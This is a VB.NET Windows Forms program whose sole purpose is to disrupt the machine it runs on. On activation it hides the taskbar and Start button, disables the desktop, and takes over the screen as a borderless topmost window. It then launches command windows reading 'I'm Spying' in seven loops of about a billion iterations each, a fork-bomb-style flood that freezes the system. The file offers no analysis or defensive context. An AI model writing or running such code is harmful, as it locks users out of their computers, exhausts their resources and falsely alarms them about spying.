Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports Microsoft
Imports Microsoft.Win32
Imports Microsoft.Win32.Registry
Public Class Form1
    Private Const SW_HIDE As Integer = 0
    Private Const SW_SHOW As Integer = 1
    <DllImport("user32.dll")>
    Private Shared Function FindWindow(className As String, windowText As String) As IntPtr
    End Function
    <DllImport("user32.dll")>
    Private Shared Function ShowWindow(hwnd As IntPtr, command As Integer) As Boolean
    End Function
    Declare Function EnableWindow Lib "user32" (ByVal hwnd As Int32, ByVal nOption As Int32) As Int32
    Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hwnd As Int32, ByVal nclass As Int32, ByVal spz1 As String, ByVal spz2 As String) As Int32
    Declare Function ShowWindow Lib "user32" (ByVal hwnd As Int32, ByVal nCmd As Int32) As Int32
    Declare Function SendMessageA Lib "user32" (ByVal hwnd As Int32, ByVal msg As Int32, ByVal wParam As Int32, ByVal TextStart As String) As Int32
    Dim Hdesk, TaskbarWnd, StartWnd, Traynotify, clockwnd As Int64, StartText As String
    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        'Ocultar Barra
        Dim retval = False
        Dim hwndTaskBar = FindWindow("Shell_TrayWnd", "")
        If hwndTaskBar <> IntPtr.Zero Then
            retval = ShowWindow(hwndTaskBar, SW_HIDE)
        End If
        'Ocultar Inicio
        Dim retval1 = False
        Dim hwndStartButton = FindWindow("Button", "Start")
        If hwndStartButton <> IntPtr.Zero Then
            retval1 = ShowWindow(hwndStartButton, SW_HIDE)
        End If
        TopMost = True
        Hdesk = FindWindow("Progman", vbNullString)
        EnableWindow(CInt(Hdesk), 0)
        Dim c As String
        c = "I'm Spying"
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        For i = 0 To 1000000000 Step 1
            Shell("cmd.exe /k" & c)
        Next
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.WindowState = FormWindowState.Maximized
    End Sub
End Class
